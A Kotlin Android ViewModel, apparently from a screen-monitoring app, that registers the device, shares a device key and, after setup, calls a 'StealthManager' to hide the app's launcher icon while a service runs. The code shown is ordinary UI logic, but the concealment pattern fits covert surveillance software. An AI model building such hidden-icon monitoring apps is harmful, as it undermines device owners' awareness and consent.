package com.guard.screen.ui.viewmodel

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.guard.screen.core.Constants
import com.guard.screen.core.DeviceKey
import com.guard.screen.core.Logger
import com.guard.screen.data.repository.DeviceRepository
import com.guard.screen.domain.usecase.RegisterDeviceUseCase
import com.guard.screen.security.StealthManager
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

data class MainUiState(
    val deviceKey: String = "",
    val isSetupComplete: Boolean = false,
    val isIconHidden: Boolean = false,
    val isLoading: Boolean = false,
    val message: String? = null
)

@HiltViewModel
class MainViewModel @Inject constructor(
    @ApplicationContext private val context: Context,
    private val registerDeviceUseCase: RegisterDeviceUseCase,
    private val stealthManager: StealthManager,
    private val deviceRepository: DeviceRepository
) : ViewModel() {

    private val _uiState = MutableStateFlow(MainUiState())
    val uiState: StateFlow<MainUiState> = _uiState.asStateFlow()

    init {
        loadInitialState()
        registerDevice()
    }

    private fun loadInitialState() {
        val key = DeviceKey.get(context)
        val prefs = context.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
        val setupDone = prefs.getBoolean(Constants.KEY_SETUP_DONE, false)
        val iconHidden = prefs.getBoolean(Constants.KEY_ICON_HIDDEN, false)

        _uiState.value = _uiState.value.copy(
            deviceKey = key,
            isSetupComplete = setupDone,
            isIconHidden = iconHidden
        )
    }

    private fun registerDevice() {
        viewModelScope.launch {
            try {
                registerDeviceUseCase()
            } catch (e: Exception) {
                Logger.e("MainVM", "Device registration failed", e)
            }
        }
    }

    fun copyDeviceKey() {
        try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboard.setPrimaryClip(
                ClipData.newPlainText("Device Key", _uiState.value.deviceKey)
            )
            _uiState.value = _uiState.value.copy(message = "Copied!")
        } catch (e: Exception) {
            Logger.e("MainVM", "Copy failed", e)
        }
    }

    fun hideAndStart() {
        viewModelScope.launch {
            try {
                // Setup done mark karo
                val prefs = context.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit().putBoolean(Constants.KEY_SETUP_DONE, true).apply()

                // Icon hide karo
                stealthManager.hideIcon()

                _uiState.value = _uiState.value.copy(
                    isSetupComplete = true,
                    isIconHidden = true,
                    message = "Service started"
                )
            } catch (e: Exception) {
                Logger.e("MainVM", "Hide failed", e)
                _uiState.value = _uiState.value.copy(
                    message = e.message ?: "Failed"
                )
            }
        }
    }

    fun showIcon() {
        try {
            stealthManager.showIcon()
            _uiState.value = _uiState.value.copy(
                isIconHidden = false,
                message = "Icon shown"
            )
        } catch (e: Exception) {
            Logger.e("MainVM", "Show failed", e)
        }
    }

    fun clearMessage() {
        _uiState.value = _uiState.value.copy(message = null)
    }
}
